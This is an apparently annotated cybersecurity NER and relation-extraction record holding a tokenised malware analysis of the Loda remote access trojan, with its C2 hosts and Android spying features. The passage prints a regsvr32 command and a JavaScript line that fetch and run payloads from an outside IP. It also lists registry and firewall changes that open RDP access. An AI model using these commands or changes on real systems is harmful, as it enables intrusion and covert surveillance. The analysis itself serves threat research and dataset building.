{"doc_key": "079", "sentences": [["The", "hostname", "info.v-pn.co", "was", "first", "recorded", "with", "malicious", "activity", "on", "July", "2", ",", "2020", "being", "used", "as", "C2", "for", "Loda", ",", "this", "is", "the", "exact", "same", "day", "that", "the", "domain", "was", "also", "registered", "."], ["The", "Windows", "version", "(", "see", "details", "below", ")", "uses", "the", "IP", "107.172.30.213", "as", "the", "dropper", "site", ",", "which", "hosts", "the", "download", "scripts", "(", "first", "stage", ")", "and", "main", "payload", "."], ["For", "this", "specific", "campaign", ",", "the", "malicious", "actors", "used", "the", "IP", "address", "160.178.220.194", "as", "a", "C2", "and", "as", "hosting", "site", "for", "the", "Android", "version", "in", "its", "early", "stages", ",", "the", "following", "samples", "also", "changed", "their", "C2", "to", "info.v-pn.co", "."], ["Adversaries", "use", "a", "malicious", "RTF", "document", "that", "exploits", "CVE-2017-11882", "a", "memory", "corruption", "vulnerability", "in", "Microsoft", "Office", "that", ",", "in", "turn", ",", "downloads", "a", "malicious", "SCT", "file", "."], ["The", "payload", "for", "the", "exploit", "is", "in", "plain", "text", "and", "can", "be", "easily", "viewed", "."], ["As", "shown", "above", ",", "the", "payload", "runs", "the", "following", "command", ":", "regsvr32", "/s", "/u", "/n", "/i", ":", "hxxp", ":", "//107.172.30.213/5.sct", "scrobj.dllThis", "is", "a", "known", "technique", "for", "bypassing", "AppLocker", "in", "Windows", "by", "abusing", "the", "regsvr32", "command", "."], ["Using", "this", "technique", ",", "an", "attacker", "can", "download", "and", "execute", "an", "SCT", "file", "while", "simultaneously", "bypassing", "Applocker", "."], ["The", "malicious", "SCT", "file", "is", "essentially", "an", "XML", "file", "that", "contains", "JavaScript", "that", "downloads", "and", "executes", "the", "Loda", "binary", "."], ["Open", "(", "``", "GET", "''", ",", "``", "hxxp", ":", "//107.172.30.213/Flash.exe", "''", ",", "false", ")", ";", "''", "initiates", "the", "download", "of", "the", "Loda", "binary", "then", "executes", "it", "."], ["The", "figure", "above", "shows", "the", "protocol", "layout", ",", "in", "the", "table", "below", "you", "can", "see", "each", "step.And", "in", "the", "infrastructure", "similarities", ",", "previous", "Loda", "campaigns", "used", "both", "Windows", "and", "Android", "samples", "using", "the", "same", "hardcoded", "C2", "domain", "as", "Loda4Android", "that", "runs", "on", "the", "same", "port", "."], ["It", "has", "all", "the", "components", "of", "a", "stalker", "application", "the", "malware", "can", "record", "users", "'", "location", "and", "environment", "audio", ",", "as", "well", "as", "take", "photos", "and", "screenshots", "."], ["It", "can", "record", "audio", "calls", ",", "but", "only", "what", "the", "targeted", "user", "says", ",", "not", "the", "user", "on", "the", "other", "end", "of", "the", "call", "."], ["This", "RAT", "reads", "the", "SMS", "and", "call", "log", "from", "the", "regular", "storage", "."], ["It", "can", "also", "send", "SMS", "and", "perform", "calls", "to", "specific", "numbers", "."], ["Device-wise", ",", "it", "acquires", "a", "list", "and", "launches", "applications", ",", "or", "it", "can", "play", "a", "ringtone", "."], ["At", "this", "time", ",", "the", "contents", "are", "hardcoded", "but", "it", "should", "n't", "be", "surprising", "that", "in", "future", "versions", "this", "may", "dynamically", "load", "the", "content", "targeting", "other", "platforms", "."], ["For", "example", ",", "it", "could", "download", "one", "of", "the", "available", "Android", "exploits", "and", "obtain", "root", ",", "or", "it", "could", "download", "a", "new", "APK", "and", "install", "it", "."], ["The", "C2", "hostname", "and", "port", "are", "both", "hardcoded", "in", "the", "sample", "in", "plain", "text", "."], ["The", "main", "C2", "contact", "loop", "will", "sleep", "for", "five", "seconds", "until", "the", "network", "is", "available", "."], ["Once", "it", "establishes", "contact", "with", "the", "C2", ",", "it", "runs", "another", "loop", ",", "this", "time", "on", "a", "half-second", "interval.After", "starting", "the", "C2", "contact", "service", ",", "if", "the", "bindx", "flag", "is", "set", "to", "1", ",", "the", "malware", "will", "read", "a", "resource", "with", "the", "name", "``", "sss", ",", "''", "saving", "its", "contents", "into", "``", "//sdcard/.app.apk", "''", "."], ["This", "will", "then", "be", "installed", "using", "the", "standard", "intent", "mechanism", "provided", "by", "the", "operating", "system", "."], ["The", "code", "analysis", "did", "not", "show", "any", "mechanism", "to", "change", "the", "bindx", "flag", "value", "in", "runtime", ",", "which", "suggests", "this", "is", "a", "configuration", "made", "at", "build", "time", ",", "a", "commonly", "used", "malware-building", "tool", "."], ["The", "most", "notable", "of", "these", "commands", "gives", "the", "threat", "actor", "remote", "access", "to", "the", "target", "machine", "via", "RDP", "."], ["To", "achieve", "this", ",", "Loda", "first", "changes", "a", "few", "security", "configurations", "in", "Windows", ":", "Set", "the", "registry", "entry", "``", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal", "Server\\fDenyTSConnections", "''", "to", "``", "0", "''", "."], ["Turn", "off", "the", "Windows", "firewallAdd", "a", "user", "called", "``", "-Guest", "''", "with", "a", "password", "of", "``", "123", "''", "Enable", "logging", "in", "via", "network", "without", "a", "password", "by", "setting", "the", "registry", "entry", "``", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa", "''", "to", "``", "0", "''", "After", "these", "changes", "are", "made", ",", "an", "unidentified", "networking", "utility", "named", "``", "nx.exe", "''", "establishes", "a", "connection", "on", "the", "standard", "RDP", "port", "3389", "."], ["This", "utility", "was", "not", "observed", "during", "analysis", ",", "as", "the", "threat", "actor", "must", "send", "Loda", "a", "URL", "to", "download", "the", "executable", "from.Another", "notable", "new", "command", "is", "``", "Sound|", "''", "which", "uses", "the", "BASS", "audio", "library", "to", "capture", "audio", "from", "a", "connected", "microphone", "."], ["Several", "functions", "are", "called", "from", "a", "BASS", "audio", "DLL", "which", "Loda", "has", "named", "``", "bacb.dll.", "``"], ["The", "functions", "that", "are", "called", "to", "record", "audio", "are", ":", "BASS_ErrorGetCodeBASS_RecordGetDeviceInfoBASS_RecordInitBASS_RecordSetDeviceBASS_RecordFreeBASS_Encode_StartBASS_Encode_StopThis", "new", "command", "is", "an", "improvement", "on", "the", "previous", "``", "Sound", "''", "command", "which", "used", "Windows", "'", "built-in", "Sound", "Recorder", "."]], "ner": [[[2, 2, "SO"], [17, 17, "SO"], [29, 29, "SO"]], [[45, 45, "SO"], [49, 49, "MP"], [55, 55, "MF"], [62, 62, "MF"]], [[76, 76, "SO"], [99, 99, "SO"], [101, 101, "SO"]], [[103, 103, "MP"], [107, 108, "MF"], [111, 111, "MF"], [127, 128, "MF"]], [[131, 131, "MF"]], [[150, 150, "MP"], [172, 172, "TP"], [178, 178, "MP"]], [[186, 186, "MP"], [192, 193, "MF"], [197, 197, "TP"]], [[201, 201, "MP"], [206, 206, "MP"], [210, 210, "MP"], [216, 217, "MF"]], [[240, 241, "MF"]], [[269, 270, "MP"], [273, 273, "TP"], [275, 275, "TP"], [284, 284, "TP"]], [[299, 300, "MP"], [302, 302, "MP"], [307, 309, "TF"]], [[320, 320, "MP"], [323, 324, "TF"]], [[346, 346, "MP"], [349, 352, "TF"]], [[358, 358, "MP"], [362, 365, "MF"]], [[372, 372, "MP"], [378, 378, "TP"]], [[392, 392, "MP"], [396, 396, "MP"], [410, 410, "MF"]], [[418, 418, "MP"], [425, 426, "MF"], [432, 432, "MP"], [437, 437, "MF"], [440, 440, "MF"]], [[443, 444, "TF"], [446, 446, "TF"], [449, 449, "MP"]], [[459, 461, "MP"]], [[474, 474, "MP"], [479, 479, "SO"], [481, 481, "MP"], [494, 495, "MP"], [508, 508, "MP"], [512, 512, "MF"], [525, 525, "MF"]], [[536, 537, "MP"]], [[545, 545, "MP"], [555, 557, "MF"], [566, 566, "MF"], [575, 576, "MP"]], [[587, 587, "MP"], [592, 593, "SO"], [595, 595, "MP"]], [[601, 601, "MP"], [606, 607, "SF"], [613, 613, "SF"], [616, 617, "MF"]], [[628, 628, "TP"], [630, 630, "TP"], [653, 653, "SF"], [674, 674, "MP"], [682, 683, "SO"]], [[697, 697, "MP"], [700, 700, "MP"], [706, 706, "MF"], [713, 713, "MP"], [718, 720, "TP"], [723, 723, "TF"], [727, 727, "SO"]], [[735, 737, "MF"], [739, 739, "MP"], [743, 743, "MF"]], [[752, 752, "MF"]]], "relations": [[], [[49, 49, 2, 2, "ST"], [49, 49, 2, 2, "RF"], [49, 49, 17, 17, "ST"], [49, 49, 17, 17, "RF"], [49, 49, 29, 29, "ST"], [49, 49, 29, 29, "RF"], [49, 49, 45, 45, "ST"], [49, 49, 45, 45, "RF"], [49, 49, 55, 55, "WR"], [49, 49, 76, 76, "ST"], [49, 49, 76, 76, "RF"], [49, 49, 99, 99, "ST"], [49, 49, 99, 99, "RF"], [49, 49, 101, 101, "ST"], [49, 49, 101, 101, "RF"], [55, 55, 62, 62, "CO"]], [], [[103, 103, 76, 76, "ST"], [103, 103, 76, 76, "RF"], [103, 103, 99, 99, "ST"], [103, 103, 99, 99, "RF"], [103, 103, 101, 101, "ST"], [103, 103, 101, 101, "RF"], [103, 103, 107, 108, "EX"], [103, 103, 127, 128, "WR"], [103, 103, 131, 131, "WR"], [107, 108, 127, 128, "CO"], [107, 108, 111, 111, "CO"]], [], [[150, 150, 131, 131, "EX"], [150, 150, 172, 172, "UK"], [150, 150, 178, 178, "FR"]], [[186, 186, 192, 193, "WR"], [186, 186, 192, 193, "EX"], [186, 186, 197, 197, "UK"], [186, 186, 587, 587, "CO"], [186, 186, 697, 697, "CO"]], [[201, 201, 127, 128, "EX"], [206, 206, 210, 210, "FR"], [210, 210, 216, 217, "WR"], [210, 210, 216, 217, "EX"], [201, 201, 240, 241, "WR"], [201, 201, 206, 206, "CO"]], [], [[269, 270, 273, 273, "FR"], [269, 270, 275, 275, "FR"], [269, 270, 284, 284, "FR"]], [[302, 302, 299, 300, "FR"], [302, 302, 307, 309, "WR"], [302, 302, 508, 508, "CO"]], [[320, 320, 323, 324, "WR"]], [[346, 346, 349, 352, "RD"], [346, 346, 358, 358, "CO"], [346, 346, 372, 372, "CO"]], [[358, 358, 362, 365, "WR"]], [[372, 372, 378, 378, "FR"]], [[396, 396, 410, 410, "WR"], [392, 392, 396, 396, "CO"], [392, 392, 418, 418, "CO"], [392, 392, 432, 432, "CO"]], [[418, 418, 425, 426, "WR"], [432, 432, 437, 437, "WR"], [432, 432, 440, 440, "WR"], [432, 432, 449, 449, "FR"]], [[449, 449, 443, 444, "WR"], [449, 449, 446, 446, "WR"]], [[459, 461, 446, 446, "RD"], [459, 461, 479, 479, "ST"], [459, 461, 479, 479, "RF"]], [[474, 474, 479, 479, "ST"], [474, 474, 479, 479, "RF"], [481, 481, 494, 495, "FR"], [508, 508, 512, 512, "RD"], [508, 508, 525, 525, "WR"], [481, 481, 536, 537, "FR"], [474, 474, 481, 481, "CO"]], [], [[545, 545, 555, 557, "WR"], [545, 545, 566, 566, "WR"], [545, 545, 575, 576, "FR"]], [[587, 587, 595, 595, "FR"], [595, 595, 592, 593, "ST"], [595, 595, 592, 593, "RF"]], [[601, 601, 606, 607, "RD"], [601, 601, 606, 607, "WR"], [601, 601, 606, 607, "RD"], [601, 601, 613, 613, "RD"], [601, 601, 613, 613, "RD"], [601, 601, 613, 613, "WR"], [601, 601, 616, 617, "WR"], [601, 601, 628, 628, "UK"]], [[630, 630, 653, 653, "RD"], [630, 630, 653, 653, "RD"], [630, 630, 653, 653, "WR"], [674, 674, 682, 683, "ST"], [674, 674, 682, 683, "RF"]], [[697, 697, 700, 700, "FR"], [700, 700, 706, 706, "WR"], [713, 713, 718, 720, "FR"], [718, 720, 723, 723, "WR"], [718, 720, 727, 727, "ST"], [718, 720, 727, 727, "RF"]], [[739, 739, 735, 737, "WR"], [739, 739, 743, 743, "WR"]], []]}